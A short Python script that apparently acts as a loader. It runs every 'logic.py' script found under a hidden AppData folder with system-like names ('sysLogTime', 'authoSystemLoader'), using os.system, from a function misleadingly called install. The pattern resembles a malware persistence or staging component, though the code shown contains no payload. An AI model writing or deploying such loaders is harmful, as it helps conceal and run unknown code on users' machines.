import os


###########################################################
#                          CLASS                          #
###########################################################

class User():
    def __init__(self):
        self.name = os.environ.get( "USERNAME" )
        self.dir = f'C:\\Users\\{os.environ.get( "USERNAME" )}\\AppData\\Local\\sysLogTime'
        self.files = f'{self.dir}\\authoSystemLoader\\-mvfm2-main'

###########################################################
#                          MKOBJ                          #
###########################################################

user = User()

###########################################################
#                       INSTALLING                        #
###########################################################



def install():

    dirs = os.listdir(f'{user.files}\\logs')

    for dir in dirs:
        os.system(f'{user.files}\\logs\\{dir}\\logic.py')




###########################################################
#                          MAIN                           #
###########################################################

def main():
    install()

if __name__ == '__main__':
    main()